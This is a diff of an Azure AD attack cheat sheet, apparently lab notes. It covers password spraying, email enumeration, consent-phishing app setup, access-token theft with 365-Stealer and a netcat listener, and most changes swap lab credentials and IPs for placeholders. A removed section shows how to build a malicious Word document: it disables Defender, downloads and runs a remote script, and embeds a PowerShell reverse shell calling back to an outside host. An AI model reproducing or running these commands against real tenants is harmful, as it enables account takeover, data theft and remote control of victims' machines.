@@ -13,7 +13,7 @@
 - https://github.com/ustayready/fireprox
 ```
 Import-Module .\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
+Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
 ```
 
 #### Find valid emails
@@ -26,7 +26,7 @@ C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
 #### Create a application
 - Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
 - Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
-- Use the URL of the student VM in the URI (https://172.16.151.x/login/authorized)
+- Use the URL of the student VM in the URI (https://xx.xx.xx.xx/login/authorized)
 - In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
 - In the left menu go to 'API permissions' and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.
 
@@ -35,8 +35,8 @@ C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
 Import-Module AzureADPreview.psd1
 
 #Use another tenant account
-$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
+$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
 Connect-AzureAD -Credential $creds
 (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
 
@@ -60,7 +60,7 @@ ManagePermissionGrantsForSelf.microsoft-user-default-legacy
 - Edit the permutations.txt to add permutations such as career, hr, users, file and backup
 ```
 . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
-Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
+Invoke-EnumerateAzureSubDomains -Base <BASE> –Verbose
 ```
 
 #### Get the access tokens
@@ -76,33 +76,16 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 - Refish the user to get a token with the extra permissions
 ```
 
-#### Create a malicious word document from a licensed vm
-```
-$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
-$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
-Enter-PSSession -Session $officeVM
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-#Generate document
-iex (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Out-Word.ps1")
-Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.38:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.38 -Port 4444" -OutputFile student38.doc
-
-#Copy document
-exit
-Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
-```
-
 #### Start a listener
 ```
-C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
+nc.exe -lvp 4444
 ```
 
 #### Abuse the access token - Uploading word doc to OneDrive
 ```
 cd C:\xampp\htdocs\365-Stealer\
 
-& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
+& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload <PATH TO DOC> --token-path C:\xampp\htdocs\365-Stealer\yourVictims\<USER>\access_token.txt
 ```
 
 #### Refresh all tokens
